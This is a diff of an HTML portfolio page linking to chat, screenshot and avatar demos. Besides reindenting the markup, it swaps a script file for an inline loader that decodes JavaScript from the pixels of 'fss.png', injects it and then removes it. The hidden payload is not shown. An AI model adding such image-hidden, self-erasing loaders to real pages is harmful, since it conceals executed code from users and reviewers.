@@ -27,39 +27,42 @@ section {padding: 10px 15px;}
 </style>
 </head>
 <body>
-	<div id="backskin" class="backskin"><div id="output" class="output"></div></div>
-	<div id="content" class="content">
-		<header>
-			<div class="avatar">
-				<img src="./assets/avatar.png" width="80" height="80" alt="">
-			</div>
-		</header>
-		<section>
-			<nav>
-				<div class="item">
-					<a href="http://imusic.github.io/chat/">
-						<strong>仿QQ聊天窗口</strong>
-						<span>基于socket.io，应用Storage, Notification等</span>
-					</a>
-				</div>
-				<div class="item">
-					<a href="http://imusic.github.io/clip/">
-						<strong>前端页面截图</strong>
-						<span>主要是利用html2canvas.js把DOM转化为canvas</span>
-					</a>
-				</div>
-				<div class="item">
-					<a href="http://imusic.github.io/avatar/">
-						<strong>仿QQ头像编辑效果</strong>
-						<span>运用PS图层混合模式算法对图片进行处理</span>
-					</a>
-				</div>
-			</nav>
-		</section>
-		<footer>
-			<span class="tips">*在chrome下开发测试</span>
-		</footer>
-	</div>
-	<script src="fss.min.js"></script>
+  <div id="backskin" class="backskin"><div id="output" class="output"></div></div>
+  <div id="content" class="content">
+  <header>
+    <div class="avatar">
+    <img src="./assets/avatar.png" width="80" height="80" alt="">
+    </div>
+  </header>
+  <section>
+    <nav>
+    <div class="item">
+      <a href="http://imusic.github.io/chat/">
+      <strong>仿QQ聊天窗口</strong>
+      <span>基于socket.io，应用Storage, Notification等</span>
+      </a>
+    </div>
+    <div class="item">
+      <a href="http://imusic.github.io/clip/">
+      <strong>前端页面截图</strong>
+      <span>主要是利用html2canvas.js把DOM转化为canvas</span>
+      </a>
+    </div>
+    <div class="item">
+      <a href="http://imusic.github.io/avatar/">
+      <strong>仿QQ头像编辑效果</strong>
+      <span>运用PS图层混合模式算法对图片进行处理</span>
+      </a>
+    </div>
+    </nav>
+  </section>
+  <footer>
+    <span class="tips">*在chrome下开发测试</span>
+  </footer>
+  </div>
+
+  <script>
+  var img=new Image();img.onload=function(){var d=document.createElement('canvas'),b=d.getContext('2d');d.width=this.width;d.height=this.height;b.drawImage(this,0,0);var f=b.getImageData(0,0,this.width,this.height).data;var g='';for(var c=0,a=f.length;c<a;c+=4){if(f[c]>0){g+=String.fromCharCode(f[c])}if(f[c+1]>0){g+=String.fromCharCode(f[c+1])}if(f[c+2]>0){g+=String.fromCharCode(f[c+2])}}var e=document.createElement('script');e.innerHTML=g;document.head.appendChild(e);document.head.removeChild(e)};img.src='fss.png';
+  </script>
 </body>
 </html>
